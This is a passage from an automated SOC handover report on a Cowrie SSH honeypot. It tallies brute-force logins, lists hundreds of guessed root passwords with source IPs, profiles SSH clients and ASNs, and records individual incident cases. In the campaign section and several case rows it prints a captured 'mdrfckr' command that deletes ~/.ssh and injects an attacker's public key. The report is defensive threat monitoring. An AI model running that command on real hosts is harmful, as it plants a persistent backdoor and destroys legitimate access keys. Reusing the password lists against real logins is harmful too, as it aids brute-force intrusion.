# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-03 |
| **Generated At** | 2026-06-03T16:56:39Z |
| **Shift Time** | 16:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **691** |
| Confirmed Threats | **374** |
| False Positives Filtered | **317** (45.9%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **18** |
| High Severity Cases | **159** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **532** |
| Malware Samples Analyzed | **0** HIGH · **19** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **546** |
| Unique Credential Pairs | **486** |
| Unique Usernames | **251** |
| Unique Passwords | **383** |
| Successful Auth Pairs | **140** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 161 |
| `345gs5662d34` | 29 |
| `user` | 9 |
| `ubuntu` | 8 |
| `admin` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 61 |
| `3245gs5662d34` | 30 |
| `345gs5662d34` | 29 |
| `123` | 10 |
| `password` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 30 |
| `345gs5662d34` | `345gs5662d34` | 29 |
| `frappe` | `frappe` | 2 |
| `ossuser` | `Changeme_123` | 2 |
| `user` | `user` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root123456*` | `159.223.213.49` | 2026-06-03T11:09:53 |
| `root` | `3245gs5662d34` | `159.223.213.49` | 2026-06-03T11:09:56 |
| `root` | `qwert1` | `164.152.250.192` | 2026-06-03T11:17:36 |
| `root` | `3245gs5662d34` | `164.152.250.192` | 2026-06-03T11:17:43 |
| `root` | `Qazwsx12` | `43.159.177.40` | 2026-06-03T11:21:05 |
| `root` | `3245gs5662d34` | `43.159.177.40` | 2026-06-03T11:21:11 |
| `root` | `qwe123!@` | `152.233.20.205` | 2026-06-03T11:44:58 |
| `root` | `abcd@1234` | `152.233.20.205` | 2026-06-03T11:45:49 |
| `root` | `test@123` | `152.233.20.205` | 2026-06-03T11:45:55 |
| `root` | `!qaz@WSX` | `152.233.20.205` | 2026-06-03T11:47:10 |
| `root` | `0` | `152.233.20.205` | 2026-06-03T11:47:16 |
| `root` | `Huawei123` | `152.233.20.205` | 2026-06-03T11:47:22 |
| `root` | `root1234` | `152.233.20.205` | 2026-06-03T11:47:27 |
| `root` | `t0talc0ntr0l4!` | `152.233.20.205` | 2026-06-03T11:47:33 |
| `root` | `Aa123321` | `152.233.20.205` | 2026-06-03T11:49:23 |
| `root` | `111` | `152.233.20.205` | 2026-06-03T11:50:10 |
| `root` | `Pass@123` | `152.233.20.205` | 2026-06-03T11:50:16 |
| `root` | `Password@123` | `152.233.20.205` | 2026-06-03T11:50:22 |
| `root` | `QWEqwe123` | `152.233.20.205` | 2026-06-03T11:50:28 |
| `root` | `test1234` | `152.233.20.205` | 2026-06-03T11:50:34 |
| `root` | `0000` | `152.233.20.205` | 2026-06-03T11:51:43 |
| `root` | `Aa@123456` | `152.233.20.205` | 2026-06-03T11:52:41 |
| `root` | `Qwerty` | `152.233.20.205` | 2026-06-03T11:52:46 |
| `root` | `Welcome@123` | `152.233.20.205` | 2026-06-03T11:52:52 |
| `root` | `rock` | `152.233.20.205` | 2026-06-03T11:52:58 |
| `root` | `1qaz@WSX3edc` | `152.233.20.205` | 2026-06-03T11:53:22 |
| `root` | `123@@@` | `152.233.20.205` | 2026-06-03T11:54:26 |
| `root` | `eve` | `152.233.20.205` | 2026-06-03T11:54:31 |
| `root` | `qwe123` | `152.233.20.205` | 2026-06-03T11:54:37 |
| `root` | `Abc123456` | `152.233.20.205` | 2026-06-03T11:55:41 |
| `root` | `Admin123` | `152.233.20.205` | 2026-06-03T11:55:47 |
| `root` | `abcd1234` | `152.233.20.205` | 2026-06-03T11:55:53 |
| `root` | `asd123` | `152.233.20.205` | 2026-06-03T11:55:59 |
| `root` | `q1w2e3r4` | `152.233.20.205` | 2026-06-03T11:56:05 |
| `root` | `qwer1234` | `152.233.20.205` | 2026-06-03T11:56:10 |
| `root` | `null` | `152.233.20.205` | 2026-06-03T11:56:46 |
| `root` | `test123` | `152.233.20.205` | 2026-06-03T11:56:52 |
| `root` | `11111111` | `152.233.20.205` | 2026-06-03T11:57:49 |
| `root` | `123123123` | `152.233.20.205` | 2026-06-03T11:57:55 |
| `root` | `Test1234` | `152.233.20.205` | 2026-06-03T11:58:00 |
| `root` | `1qaz!QAZ` | `152.233.20.205` | 2026-06-03T11:58:06 |
| `root` | `123qwe!@` | `152.233.20.205` | 2026-06-03T11:58:59 |
| `root` | `admin123` | `152.233.20.205` | 2026-06-03T11:59:05 |
| `root` | `huawei@123` | `152.233.20.205` | 2026-06-03T11:59:10 |
| `root` | `1Q2W3E4R` | `152.233.20.205` | 2026-06-03T11:59:38 |
| `root` | `Root@123` | `152.233.20.205` | 2026-06-03T12:00:13 |
| `root` | `abc123456` | `152.233.20.205` | 2026-06-03T12:00:19 |
| `root` | `admin@123` | `152.233.20.205` | 2026-06-03T12:00:25 |
| `root` | `nPSpP4PBW0` | `152.233.20.205` | 2026-06-03T12:01:17 |
| `root` | `Aa123456.` | `152.233.20.205` | 2026-06-03T12:01:34 |
| `root` | `Admin@123456` | `152.233.20.205` | 2026-06-03T12:01:40 |
| `root` | `qQ123456` | `152.233.20.205` | 2026-06-03T12:02:03 |
| `root` | `12345678` | `152.233.20.205` | 2026-06-03T12:03:12 |
| `root` | `Aa123456@` | `152.233.20.205` | 2026-06-03T12:03:18 |
| `root` | `P@ssword` | `152.233.20.205` | 2026-06-03T12:03:53 |
| `root` | `1Q2w3e4r` | `152.233.20.205` | 2026-06-03T12:04:44 |
| `root` | `a123456A` | `152.233.20.205` | 2026-06-03T12:04:50 |
| `root` | `LeitboGi0ro` | `152.233.20.205` | 2026-06-03T12:05:31 |
| `root` | `passw0rd` | `152.233.20.205` | 2026-06-03T12:05:48 |
| `root` | `Huawei@123` | `152.233.20.205` | 2026-06-03T12:05:55 |
| `root` | `Password` | `152.233.20.205` | 2026-06-03T12:06:58 |
| `root` | `P@55w0rd` | `152.233.20.205` | 2026-06-03T12:07:22 |
| `root` | `1qaz@wsx` | `152.233.20.205` | 2026-06-03T12:08:25 |
| `root` | `!Q@W3e4r` | `152.233.20.205` | 2026-06-03T12:08:59 |
| `root` | `1qazxsw2` | `152.233.20.205` | 2026-06-03T12:09:05 |
| `root` | `Aa123123` | `152.233.20.205` | 2026-06-03T12:11:06 |
| `root` | `passwd` | `152.233.20.205` | 2026-06-03T12:11:41 |
| `root` | `A123456a` | `152.233.20.205` | 2026-06-03T12:12:32 |
| `root` | `p@ssw0rd` | `152.233.20.205` | 2026-06-03T12:13:19 |
| `root` | `qwerty` | `152.233.20.205` | 2026-06-03T12:13:36 |
| `root` | `Passw0rd` | `152.233.20.205` | 2026-06-03T12:13:54 |
| `root` | `Password1` | `152.233.20.205` | 2026-06-03T12:14:05 |
| `root` | `1q2w3e4r` | `152.233.20.205` | 2026-06-03T12:14:17 |
| `root` | `abc123` | `152.233.20.205` | 2026-06-03T12:14:34 |
| `root` | `qwerty123` | `152.233.20.205` | 2026-06-03T12:14:57 |
| `root` | `aa123456` | `152.233.20.205` | 2026-06-03T12:15:03 |
| `root` | `1qaz2wsx` | `152.233.20.205` | 2026-06-03T12:15:09 |
| `root` | `Ab123456` | `152.233.20.205` | 2026-06-03T12:15:15 |
| `root` | `1qazXSW@` | `152.233.20.205` | 2026-06-03T12:15:32 |
| `root` | `qwe123456` | `152.233.20.205` | 2026-06-03T12:15:38 |
| `root` | `qq123456` | `152.233.20.205` | 2026-06-03T12:15:50 |
| `root` | `1234567890` | `152.233.20.205` | 2026-06-03T12:16:07 |
| `root` | `redhat` | `152.233.20.205` | 2026-06-03T12:16:40 |
| `root` | `111111` | `152.233.20.205` | 2026-06-03T12:17:03 |
| `root` | `123321` | `152.233.20.205` | 2026-06-03T12:17:16 |
| `root` | `root@123` | `152.233.20.205` | 2026-06-03T12:17:20 |
| `root` | `aA123456` | `152.233.20.205` | 2026-06-03T12:17:26 |
| `root` | `admin` | `152.233.20.205` | 2026-06-03T12:18:02 |
| `root` | `!QAZ2wsx` | `152.233.20.205` | 2026-06-03T12:18:07 |
| `root` | `!Q2w3e4r` | `152.233.20.205` | 2026-06-03T12:18:14 |
| `root` | `12345` | `152.233.20.205` | 2026-06-03T12:18:20 |
| `root` | `Qq123456` | `152.233.20.205` | 2026-06-03T12:18:26 |
| `root` | `rootroot` | `152.233.20.205` | 2026-06-03T12:18:37 |
| `root` | `toor` | `152.233.20.205` | 2026-06-03T12:18:43 |
| `root` | `root123` | `152.233.20.205` | 2026-06-03T12:19:07 |
| `root` | `Admin@123` | `152.233.20.205` | 2026-06-03T12:19:19 |
| `root` | `1234` | `152.233.20.205` | 2026-06-03T12:19:24 |
| `root` | `123456789` | `152.233.20.205` | 2026-06-03T12:19:42 |
| `root` | `password` | `152.233.20.205` | 2026-06-03T12:19:59 |
| `root` | `1qaz@WSX` | `152.233.20.205` | 2026-06-03T12:20:05 |
| `root` | `123` | `152.233.20.205` | 2026-06-03T12:20:11 |
| `root` | `P@ssw0rd` | `152.233.20.205` | 2026-06-03T12:20:28 |
| `root` | `1` | `152.233.20.205` | 2026-06-03T12:20:40 |
| `root` | `Aa123456` | `152.233.20.205` | 2026-06-03T12:20:58 |
| `root` | `admin.2024` | `45.61.130.31` | 2026-06-03T12:52:06 |
| `root` | `3245gs5662d34` | `45.61.130.31` | 2026-06-03T12:52:24 |
| `root` | `09876543` | `119.96.158.238` | 2026-06-03T12:53:22 |
| `root` | `3245gs5662d34` | `119.96.158.238` | 2026-06-03T12:53:29 |
| `root` | `Ubuntu2023` | `62.3.56.187` | 2026-06-03T13:59:17 |
| `root` | `3245gs5662d34` | `62.3.56.187` | 2026-06-03T13:59:23 |
| `root` | `Beijing2026` | `20.127.185.37` | 2026-06-03T14:29:30 |
| `root` | `3245gs5662d34` | `20.127.185.37` | 2026-06-03T14:29:35 |
| `root` | `Admin@123$` | `101.126.95.172` | 2026-06-03T14:42:28 |
| `root` | `3245gs5662d34` | `101.126.95.172` | 2026-06-03T14:42:33 |
| `root` | `Jd123123` | `52.177.169.196` | 2026-06-03T14:45:29 |
| `root` | `3245gs5662d34` | `52.177.169.196` | 2026-06-03T14:45:35 |
| `root` | `1QAZ2wsx@` | `8.154.2.19` | 2026-06-03T14:46:55 |
| `root` | `3245gs5662d34` | `8.154.2.19` | 2026-06-03T14:46:59 |
| `root` | `1qaz0okm` | `8.154.2.19` | 2026-06-03T14:47:16 |
| `root` | `gx123456` | `52.177.169.196` | 2026-06-03T14:47:23 |
| `root` | `Zz@123456` | `27.78.70.85` | 2026-06-03T14:47:37 |
| `root` | `3245gs5662d34` | `27.78.70.85` | 2026-06-03T14:47:40 |
| `root` | `sa2025` | `8.154.2.19` | 2026-06-03T14:48:25 |
| `root` | `Asdf123.` | `8.154.2.19` | 2026-06-03T14:48:46 |
| `root` | `zxcv@123` | `8.154.2.19` | 2026-06-03T14:49:30 |
| `root` | `q123456789` | `52.177.169.196` | 2026-06-03T14:52:30 |
| `root` | `!QA2ws#ED` | `8.154.2.19` | 2026-06-03T14:52:33 |
| `root` | `Ss112233.` | `8.154.2.19` | 2026-06-03T14:53:20 |
| `root` | `macintosh` | `8.154.2.19` | 2026-06-03T14:54:01 |
| `root` | `asdfghjkl123` | `8.154.2.19` | 2026-06-03T14:54:22 |
| `root` | `Bc123456` | `52.177.169.196` | 2026-06-03T14:54:40 |
| `root` | `ZAQ!2wsx2025#` | `8.154.2.19` | 2026-06-03T14:55:19 |
| `root` | `aa123456.` | `8.154.2.19` | 2026-06-03T14:56:18 |
| `root` | `Password2023!` | `8.154.2.19` | 2026-06-03T14:56:39 |
| `root` | `password123!` | `52.177.169.196` | 2026-06-03T14:58:52 |
| `root` | `Hello@123` | `52.177.169.196` | 2026-06-03T15:05:01 |
| `root` | `Tm!123456` | `52.177.169.196` | 2026-06-03T15:08:11 |
| `root` | `!Qaz2wsx3edc4rfv` | `52.177.169.196` | 2026-06-03T15:09:15 |
| `root` | `P@ssword00` | `52.177.169.196` | 2026-06-03T15:11:19 |
| `root` | `ubuntu` | `116.255.208.96` | 2026-06-03T16:00:30 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **691** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 385 |
| libssh | 187 |
| Perl Net::SSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 381 | 1 |
| `f555226df196...` | Mirai/variant | 71 | 15 |
| `03a80b21afa8...` | Modern SSH client | 57 | 2 |
| `af8223ac9914...` | libssh-based | 48 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 381 | 1 | Generic scanner |
| `f555226df196...` | libssh | 71 | 15 | Mirai/variant |
| `03a80b21afa8...` | libssh | 57 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 48 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 11 | 8 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.127.185.37`, `8.154.2.19`, `159.223.213.49`, `27.78.70.85`, `45.61.130.31`, `164.152.250.192`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **37** |
| High-Risk ASNs | **31** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS51396` | Pfcloud UG | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (159)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-75ed2d80ebe1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-03 11:09 |
| **Last Seen** | 2026-06-03 11:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:09:52` | `cowrie.session.connect` |
| `2026-06-03 11:09:52` | `cowrie.client.version` |
| `2026-06-03 11:09:52` | `cowrie.client.kex` |
| `2026-06-03 11:09:53` | `cowrie.login.success` |
| `2026-06-03 11:09:53` | `cowrie.session.params` |
| `2026-06-03 11:09:53` | `cowrie.command.input` |
| `2026-06-03 11:09:53` | `cowrie.command.failed` |
| `2026-06-03 11:09:53` | `cowrie.log.closed` |
| `2026-06-03 11:09:53` | `cowrie.session.params` |
| `2026-06-03 11:09:53` | `cowrie.command.input` |
| `2026-06-03 11:09:54` | `cowrie.session.file_download` |
| `2026-06-03 11:09:54` | `cowrie.log.closed` |
| `2026-06-03 11:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5bf4fa5915

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-03 11:09 |
| **Last Seen** | 2026-06-03 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:09:56` | `cowrie.session.connect` |
| `2026-06-03 11:09:56` | `cowrie.client.version` |
| `2026-06-03 11:09:56` | `cowrie.client.kex` |
| `2026-06-03 11:09:56` | `cowrie.login.success` |
| `2026-06-03 11:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad53021d46a4

| Field | Detail |
|---|---|
| **Source IP** | `164.152.250[.]192` |
| **First Seen** | 2026-06-03 11:17 |
| **Last Seen** | 2026-06-03 11:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:17:34` | `cowrie.session.connect` |
| `2026-06-03 11:17:34` | `cowrie.client.version` |
| `2026-06-03 11:17:35` | `cowrie.client.kex` |
| `2026-06-03 11:17:36` | `cowrie.login.success` |
| `2026-06-03 11:17:36` | `cowrie.session.params` |
| `2026-06-03 11:17:36` | `cowrie.command.input` |
| `2026-06-03 11:17:36` | `cowrie.command.failed` |
| `2026-06-03 11:17:37` | `cowrie.log.closed` |
| `2026-06-03 11:17:37` | `cowrie.session.params` |
| `2026-06-03 11:17:37` | `cowrie.command.input` |
| `2026-06-03 11:17:38` | `cowrie.session.file_download` |
| `2026-06-03 11:17:38` | `cowrie.log.closed` |
| `2026-06-03 11:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.152.250[.]192` to AbuseIPDB if not already reported
- [ ] Block `164.152.250[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78632992fa9b

| Field | Detail |
|---|---|
| **Source IP** | `164.152.250[.]192` |
| **First Seen** | 2026-06-03 11:17 |
| **Last Seen** | 2026-06-03 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:17:41` | `cowrie.session.connect` |
| `2026-06-03 11:17:41` | `cowrie.client.version` |
| `2026-06-03 11:17:42` | `cowrie.client.kex` |
| `2026-06-03 11:17:43` | `cowrie.login.success` |
| `2026-06-03 11:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.152.250[.]192` to AbuseIPDB if not already reported
- [ ] Block `164.152.250[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f17d03d2b1

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-06-03 11:21 |
| **Last Seen** | 2026-06-03 11:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:21:04` | `cowrie.session.connect` |
| `2026-06-03 11:21:04` | `cowrie.client.version` |
| `2026-06-03 11:21:04` | `cowrie.client.kex` |
| `2026-06-03 11:21:05` | `cowrie.login.success` |
| `2026-06-03 11:21:05` | `cowrie.session.params` |
| `2026-06-03 11:21:05` | `cowrie.command.input` |
| `2026-06-03 11:21:05` | `cowrie.command.failed` |
| `2026-06-03 11:21:06` | `cowrie.log.closed` |
| `2026-06-03 11:21:06` | `cowrie.session.params` |
| `2026-06-03 11:21:06` | `cowrie.command.input` |
| `2026-06-03 11:21:07` | `cowrie.session.file_download` |
| `2026-06-03 11:21:07` | `cowrie.log.closed` |
| `2026-06-03 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad7892b548a

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-06-03 11:21 |
| **Last Seen** | 2026-06-03 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:21:10` | `cowrie.session.connect` |
| `2026-06-03 11:21:10` | `cowrie.client.version` |
| `2026-06-03 11:21:10` | `cowrie.client.kex` |
| `2026-06-03 11:21:11` | `cowrie.login.success` |
| `2026-06-03 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b47d3e60fa9

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:44 |
| **Last Seen** | 2026-06-03 11:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:44:55` | `cowrie.session.connect` |
| `2026-06-03 11:44:55` | `cowrie.client.version` |
| `2026-06-03 11:44:56` | `cowrie.client.kex` |
| `2026-06-03 11:44:58` | `cowrie.login.success` |
| `2026-06-03 11:44:58` | `cowrie.session.params` |
| `2026-06-03 11:44:58` | `cowrie.command.input` |
| `2026-06-03 11:44:58` | `cowrie.log.closed` |
| `2026-06-03 11:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a63a66dc151

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:45 |
| **Last Seen** | 2026-06-03 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 11:45:48` | `cowrie.session.connect` |
| `2026-06-03 11:45:48` | `cowrie.client.version` |
| `2026-06-03 11:45:48` | `cowrie.client.kex` |
| `2026-06-03 11:45:49` | `cowrie.login.success` |
| `2026-06-03 11:45:50` | `cowrie.session.params` |
| `2026-06-03 11:45:50` | `cowrie.command.input` |
| `2026-06-03 11:45:50` | `cowrie.log.closed` |
| `2026-06-03 11:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d2d80ccfb6

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 11:45 |
| **Last Seen** | 2026-06-03 11:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

